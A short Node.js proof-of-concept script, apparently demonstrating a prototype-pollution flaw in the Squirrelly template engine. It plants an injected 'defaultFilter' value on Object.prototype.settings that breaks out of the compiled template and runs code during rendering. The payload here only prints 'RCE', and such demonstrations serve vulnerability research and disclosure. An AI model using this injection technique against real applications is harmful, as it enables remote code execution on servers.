var sqrl = require('squirrelly')
const path = require('path')


templatePath = path.join(__dirname+'/views/', 'each.sqrl');

Object.prototype.settings = {
   'view options':{
      'defaultFilter': "e')); console.log('RCE')//",
   }
};

sqrl.renderFile(templatePath, { kids: ['Ben', 'Polly', 'Joel', 'Phronsie', 'Davie'] });